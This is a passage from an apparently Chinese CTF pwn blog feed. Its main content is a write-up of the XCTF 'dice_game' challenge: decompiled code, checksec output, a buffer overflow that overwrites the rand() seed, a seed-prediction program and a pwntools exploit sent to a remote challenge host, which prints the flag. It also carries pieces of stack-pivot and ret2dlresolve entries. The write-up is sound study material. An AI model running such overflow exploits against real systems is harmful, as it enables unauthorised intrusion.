operator">*</span><span class="token punctuation">]</span> Switching to interactive modeCan you solve <span class="token keyword">this</span> sign<span class="token operator">-</span>in problem<span class="token operator">?</span>$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h2 id="对于lea-esp-ecx-0x4"><a href="#对于lea-esp-ecx-0x4" class="headerlink" title="对于lea esp,[ecx-0x4]"></a>对于lea esp,[ecx-0x4]</h2><p>出现这个指令而不是leave说明这个程序应该是在64位下编译的32位程序，大佬说这是i386的平栈方式。main函数的ret，一旦覆盖大量的数据，就会导致栈顶地址出错。所以之前我一直认为是无法溢出成功的。因为一旦溢出大量数据，也会修改ECX的值，导致ESP的值出问题。</p><p>实际上在x64下编译的x86程序在ret前都会产生这一段代码。在我们使用栈溢出利用的时候，会导致栈帧出错。刚开始的初学者很容易一筹莫展（比如以前的我），因为无法完成一次EIP覆写。但是实际上，反复调试了几遍之后，就发现这道题并非不可利用。<br>其实既然ECX对ret时的ESP能产生直接影响，那么通过控制ECX也能间接控制ESP<br>只需要找到pop ecx 时候对应的栈顶，就能控制ECX。进而控制整个栈帧。</p><p>一般会利用这个指令来进行stack povit，栈迁移到bss段之类的</p><p>详情见：<a href="https://www.anquanke.com/post/id/187875" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187875</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-DICE_GAME</title>
      <link href="/2020/08/19/xctf-challenge-dice-game/"/>
      <url>/2020/08/19/xctf-challenge-dice-game/</url>
      
        <content type="html"><![CDATA[<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-python"><code class="language-python">主函数：__int64 __fastcall main<span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> char <span class="token operator">**</span>a2<span class="token punctuation">,</span> char <span class="token operator">**</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  char buf<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>50h<span class="token punctuation">]</span>  char v5<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>37h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>19h<span class="token punctuation">]</span>  ssize_t v6<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>38h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>18h<span class="token punctuation">]</span>  unsigned int seed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>40h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>10h<span class="token punctuation">]</span>  unsigned int v8<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>4Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>4h<span class="token punctuation">]</span>  memset<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 48uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>seed <span class="token operator">=</span> time<span class="token punctuation">(</span>0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">//</span>随机数种子  printf<span class="token punctuation">(</span><span class="token string">"Welcome, let me know your name: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> 80uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token operator">//</span> overflow  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;=</span> <span class="token number">49</span> <span class="token punctuation">)</span>    buf<span class="token punctuation">[</span>v6 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  printf<span class="token punctuation">(</span><span class="token string">"Hi, %s. Let's play a game.\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  srand<span class="token punctuation">(</span>seed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    printf<span class="token punctuation">(</span><span class="token string">"Game %d/50\n"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>     v5 <span class="token operator">=</span> sub_A20<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> <span class="token number">50</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      sub_B28<span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">+</span><span class="token operator">+</span>v8<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  puts<span class="token punctuation">(</span><span class="token string">"Bye bye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> 0LL<span class="token punctuation">;</span><span class="token punctuation">}</span>signed __int64 sub_A20<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  signed __int64 result<span class="token punctuation">;</span> <span class="token operator">//</span> rax  __int16 v1<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>4h<span class="token punctuation">]</span>  __int16 v2<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Eh<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>2h<span class="token punctuation">]</span>  printf<span class="token punctuation">(</span><span class="token string">"Give me the point(1~6): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  _isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%hd"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">//</span>scanf的格式化字符串，h代表短数据，l代表长数据  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> v1 <span class="token operator">&lt;=</span> <span class="token number">6</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v2 <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token operator">//</span>v2 <span class="token operator">==</span> <span class="token number">1</span><span class="token operator">~</span><span class="token number">6</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">|</span> v1 <span class="token operator">></span> <span class="token number">6</span> <span class="token operator">|</span><span class="token operator">|</span> v2 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">|</span> v2 <span class="token operator">></span> <span class="token number">6</span> <span class="token punctuation">)</span>      _assert_fail<span class="token punctuation">(</span><span class="token string">"(point>=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint>=1 &amp;&amp; sPoint&lt;=6)"</span><span class="token punctuation">,</span> <span class="token string">"dice_game.c"</span><span class="token punctuation">,</span> 24u<span class="token punctuation">,</span> <span class="token string">"dice_game"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">//</span>无视    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> v2 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>      puts<span class="token punctuation">(</span><span class="token string">"You win."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> 1LL<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      puts<span class="token punctuation">(</span><span class="token string">"You lost."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    puts<span class="token punctuation">(</span><span class="token string">"Invalid value!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span>后门：int __fastcall sub_B28<span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  char s<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>10h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>70h<span class="token punctuation">]</span>  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>78h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>  printf<span class="token punctuation">(</span><span class="token string">"Congrats %s\n"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  stream <span class="token operator">=</span> fopen<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fgets<span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  puts<span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-python"><code class="language-python">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge<span class="token operator">/</span>dice_game$ checksec dice_game<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/dice_game/dice_game'</span>    Arch<span class="token punctuation">:</span>     amd64<span class="token number">-64</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Full RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled    PIE<span class="token punctuation">:</span>      PIE enabledhunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge<span class="token operator">/</span>dice_game$ hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge<span class="token operator">/</span>dice_game$ <span class="token punctuation">.</span><span class="token operator">/</span>dice_gameWelcome<span class="token punctuation">,</span> let me know your name<span class="token punctuation">:</span> dadHi<span class="token punctuation">,</span> dad<span class="token punctuation">.</span> Let's play a game<span class="token punctuation">.</span>Game <span class="token number">1</span><span class="token operator">/</span><span class="token number">50</span>Give me the point<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">~</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">2</span>You lost<span class="token punctuation">.</span>Bye bye!</code></pre><p>保护全开几乎全开，结合上面的后门应该主要目的是实现跳转。</p><h2 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h2><pre class=" language-c"><code class="language-c">main函数中：<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-50h]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+37h] [rbp-19h]</span>  ssize_t v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4Ch] [rbp-4h]</span>v6 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">// overflow</span></code></pre><p>显然可以读入80个字符，而buf到rbp的距离也是80个字符（0x50），所以 这里定义的变量都可以覆盖成我们想要的</p><pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 <span class="token function">sub_A20</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数中：<span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%hd"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//scanf的格式化字符串，h代表短数据，l代表长数据</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> v1 <span class="token operator">&lt;=</span> <span class="token number">6</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v2 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//v2 == 1~6</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">6</span> <span class="token operator">||</span> v2 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token number">6</span> <span class="token punctuation">)</span>      <span class="token function">_assert_fail</span><span class="token punctuation">(</span><span class="token string">"(point>=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint>=1 &amp;&amp; sPoint&lt;=6)"</span><span class="token punctuation">,</span> <span class="token string">"dice_game.c"</span><span class="token punctuation">,</span> <span class="token number">24u</span><span class="token punctuation">,</span> <span class="token string">"dice_game"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//无视</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> v2 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You win."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You lost."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid value!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>主要功能是读入一个短整型数字于随机数进行比较，相等则 you win。在main函数中对该函数的调用可知这个比较会进行50次<br>成功比到50次后就进入后门获取flag</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>程序想让我们和随机数 成功比对50次，这显然是不可能的。所以我们利用buf数组的溢出将随机数种子篡改为0.因为随机数种子在read之前就赋值了，我们篡改后就会固定不变。</strong><br>（之前我一直在想办法篡改v8，使其等于50，这样我成功猜对一个数就行了，但是v8的赋值是在read之后所以，还是会被改回来。为此我在这里花了近两个小时，很烦)</p><h3 id="获取随机数"><a href="#获取随机数" class="headerlink" title="获取随机数"></a>获取随机数</h3><p>在linux中编写一个获取随机数的程序（不要再Windows中，因为环境不一样）</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">50</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d,"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> </code></pre><p>结果：</p><pre class=" language-python"><code class="language-python">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge<span class="token operator">/</span>dice_game$ <span class="token punctuation">.</span><span class="token operator">/</span>test <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span></code></pre><p>直接复制下来当作脚本元组</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = process('./dice_game')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">52660</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">64</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'BBBB'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#这波是没注意v8的赋值问题，浪费时间的证据</span><span class="token comment" spellcheck="true">#gdb.attach(sh)                                #主要是p64（0）这里篡改了seed[2]的值起作用</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rand <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    seed <span class="token operator">=</span> str<span class="token punctuation">(</span>rand<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#leep(1)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-python"><code class="language-python">You win<span class="token punctuation">.</span>Game <span class="token number">50</span><span class="token operator">/</span><span class="token number">50</span>Give me the point<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">~</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span> You win<span class="token punctuation">.</span>Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPcyberpeace<span class="token punctuation">{</span><span class="token number">3c15b24b5df0e56ae8d362d6a0f9c8dc</span><span class="token punctuation">}</span>Bye bye!<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2dlresovle And Roputils</title>
      <link href="/2020/08/18/ret2dlresovle-and-roputils/"/>
      <url>/2020/08/18/ret2dlresovle-and-roputils/</url>
      
        <content type="html"><![CDATA[<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ssize_t <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token 